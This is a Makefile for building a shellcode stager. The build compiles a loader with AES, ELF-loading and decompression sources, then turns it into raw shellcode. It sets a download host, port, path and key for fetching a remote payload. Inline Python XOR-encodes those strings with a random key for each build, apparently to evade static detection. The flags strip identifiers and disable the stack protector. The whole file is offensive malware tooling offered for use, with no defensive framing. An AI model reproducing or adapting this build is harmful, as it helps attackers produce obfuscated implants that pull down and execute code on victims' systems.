CC = gcc
# Add -ffunction-sections -fdata-sections
CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
         -fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections

# Add -Wl,--gc-sections
LDFLAGS = -nostdlib -static -Wl,-Ttext-segment=0x10000000 -s -Wl,--gc-sections


# Default configuration (can be overridden by environment variables)
DOWNLOAD_HOST ?= 127.0.0.1
DOWNLOAD_PORT ?= 8080
DOWNLOAD_PATH ?= /payload
DOWNLOAD_KEY ?= secret
LISTENER_TYPE ?= HTTP

# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(1, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Define listener type
CFLAGS += -DLISTENER_$(LISTENER_TYPE)

# Config options
CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)

SRCS = main.c utils.c aes.c elf_loader.c tinflate.c
TARGET = stager
SHELLCODE = stager.bin

.PHONY: all clean $(TARGET)

all: $(TARGET) $(SHELLCODE)

$(TARGET):
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(SRCS)

$(SHELLCODE): $(TARGET)
	objcopy -O binary -j .text -j .rodata -j .data $(TARGET) $@
	@echo "Shellcode generated at $(PWD)/$@"

clean:
	rm -f $(TARGET) $(SHELLCODE)

